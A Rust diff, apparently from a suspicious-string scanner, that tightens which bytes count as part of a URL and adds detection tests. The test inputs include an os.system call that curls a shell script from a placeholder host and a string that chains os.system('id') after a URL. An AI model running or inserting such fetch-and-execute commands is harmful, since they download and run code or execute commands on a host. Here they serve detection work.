@@ -216,19 +216,11 @@ fn is_http_url_byte(byte: u8) -> bool {
                 | b'/'
                 | b'?'
                 | b'#'
-                | b'['
-                | b']'
                 | b'@'
                 | b'!'
                 | b'$'
-                | b'&'
-                | b'\''
-                | b'('
-                | b')'
                 | b'*'
                 | b'+'
-                | b','
-                | b';'
                 | b'='
                 | b'%'
         )
@@ -1428,6 +1420,10 @@ mod tests {
     fn suspicious_string_matching_preserves_code_around_url_literals() {
         assert!(
             suspicious_string_matches("os.system('curl https://example.invalid/p.sh')")
+                .contains(&"os.system".to_string())
+        );
+        assert!(
+            suspicious_string_matches("u='https://example.invalid/p';os.system('id')")
                 .contains(&"os.system".to_string())
         );
         assert!(suspicious_string_matches(
